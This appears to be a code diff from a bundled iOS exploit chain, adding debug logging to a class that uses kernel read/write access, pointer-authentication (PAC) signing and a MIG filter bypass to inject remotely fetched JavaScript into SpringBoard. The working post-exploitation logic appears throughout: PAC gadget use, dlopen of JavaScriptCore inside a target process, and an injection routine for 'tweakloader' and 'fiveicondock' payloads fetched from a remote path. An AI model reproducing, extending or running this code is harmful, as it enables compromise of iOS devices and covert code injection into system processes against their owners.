@@ -1620,20 +1620,23 @@ class InjectJS {
 		const mem = this.task.mem();
 		const krwCtx = this.task.krwCtx();
 
+		console.log(TAG, "startWithTask: agentPid=" + agentPid + " mem=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(mem));
+		console.log(TAG, "pre-PAC invoking addr: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.#invokingAddr));
+
 		// Sign __invoking__ function address
 		this.#invokingAddr = this.task.pac(this.#invokingAddr, 0);
-		//console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));
+		console.log(TAG, "post-PAC invoking addr: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.#invokingAddr));
 
 		this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
 		const lib = this.task.call(1000, "dlopen", mem, RTLD_LAZY);
-		//console.log(TAG, "lib: " + Utils.hex(lib));
+		console.log(TAG, "JSC lib handle: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(lib));
 
 		// Create a JSC context and get pointer to exceptionHandler NSBlock
 		const jscontext = this.#callObjcRetain(this.#JSContextClass, "new");
-		//console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));
+		console.log(TAG, "Remote JSContext: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(jscontext));
 
 		const exceptionHandler = this.task.read64(jscontext + 0x28n);
-		//console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));
+		console.log(TAG, "exceptionHandler block: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(exceptionHandler));
 
 		// Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
 		// We replace exceptionHandler NSInvocation later in this code.
@@ -1687,7 +1690,7 @@ class InjectJS {
 		this.task.call(100, "JSObjectSetProperty", jsctx, globalObject, jsName, nativeCallBuff);
 
 		let localCallBuff = new BigUint64Array(34);
-		
+
 		// Second (final) __invoking__ arguments
 		localCallBuff[0] = 0x41414141n;	// this should be overwritten at every function call
 		localCallBuff[1] = resultBuff; // Result buffer
@@ -1720,6 +1723,10 @@ class InjectJS {
 		localCallBuff[31] = desiredPacGadget;
 		localCallBuff[32] = BigInt(agentPid);
 		localCallBuff[33] = jscontext;
+
+		console.log(TAG, "PAC diagnostics: invoking=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(localCallBuff[10]) + " dlsym=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(localCallBuff[21]) + " memcpy=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(localCallBuff[22]) + " malloc=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(localCallBuff[23]));
+		console.log(TAG, "PAC gadget: raw=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getPaciaGadget()) + " signed=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(desiredPacGadget) + " kbase=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(localCallBuff[30]));
+		console.log(TAG, "callBuff=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(callBuff) + " jsctx=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(jsctx) + " jscontext=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(jscontext) + " agentPid=" + agentPid);
 
 		//console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
 		//console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
@@ -1770,21 +1777,12 @@ class InjectJS {
 		//this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
 		//console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));
 
-		console.log(TAG, "Starting JS script for target: " + this.#target);
+		console.log(TAG, "Starting JS script for target: " + this.#target + " scriptStr=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(scriptStr));
+		console.log(TAG, "About to evaluateScript — PAC violation would crash here or inside fiveicondock");
 
-		//const evaluateStr = this.#writeCFStr(mem, "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();");
-		//const evaluateStr = this.#writeCFStr(mem, "invoker();");
-		//const evaluateStr = this.#writeCFStr(mem, "eval(loader);");
-		//const evaluateStr = this.#writeCFStr(mem, scriptStr);
 		this.#callObjc(jscontext, "evaluateScript:", scriptStr);
-		//this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
-		//this.#callObjc(jscontext, "evaluateScript:", evaluateStr);
 
-		// Read data from result
-		//const retVal = this.task.read64(resultBuff);
-		//console.log(TAG, "Result: " + retVal);
-
-		console.log(TAG, "All done!");
+		console.log(TAG, "evaluateScript returned (fiveicondock dispatched to main thread)");
 
 		return true;
 	}
@@ -8541,18 +8539,24 @@ function injectCorunaTweakloader(existingTask, migFilterBypass, agentPid) {
 
 function injectLightweightSpringBoardPayload(existingTask, migFilterBypass, agentPid, path, label) {
 	LOG("[PE] Injecting " + label + " into SpringBoard...");
+	LOG("[PE] agentPid=" + agentPid + " existingTask.pid=" + (existingTask && existingTask.pid ? existingTask.pid() : "N/A"));
+	LOG("[PE] code source: " + (typeof globalThis.__fiveicondock_code === 'string' && globalThis.__fiveicondock_code.length > 0 ? "prefetched (" + globalThis.__fiveicondock_code.length + " bytes)" : "fetchRemoteScript(" + path + ")"));
 	let code = (typeof globalThis.__fiveicondock_code === 'string' && globalThis.__fiveicondock_code.length > 0) ? globalThis.__fiveicondock_code : fetchRemoteScript(path);
 	if (!code) {
 		LOG("[PE] " + label + " fetch failed");
 		return false;
 	}
+	LOG("[PE] " + label + " code loaded: " + code.length + " bytes");
 	try {
+		LOG("[PE] Creating InjectJS loader for " + label + "...");
 		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](existingTask, code, migFilterBypass);
+		LOG("[PE] InjectJS loader created, calling inject(agentPid=" + agentPid + ")...");
 		let ok = loader.inject(agentPid);
 		LOG("[PE] " + label + " inject result: " + ok);
 		return ok;
 	} catch (e) {
 		LOG("[PE] " + label + " inject exception: " + String(e));
+		LOG("[PE] " + label + " stack: " + (e.stack || "no stack"));
 		return false;
 	}
 }
